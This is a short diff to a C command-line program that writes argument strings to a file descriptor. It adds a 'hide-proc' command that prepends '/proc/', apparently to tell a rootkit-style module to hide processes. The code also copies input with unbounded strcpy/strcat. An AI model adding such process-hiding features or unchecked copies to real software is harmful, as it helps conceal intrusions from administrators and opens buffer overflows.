@@ -33,8 +33,11 @@ int main(int argc, char* argv[]) {
 
 	strcpy(message, argv[1]);
 	strcat(message, " ");
-	if (argc == 3)
+	if (argc == 3) {
+		if (strcmp(argv[1], "hide-proc") == 0)
+			strcat(message, "/proc/");
 		strcat(message, argv[2]);
+	}
 
 	ret = write(fd, message, 128);
 	if (ret < 0)
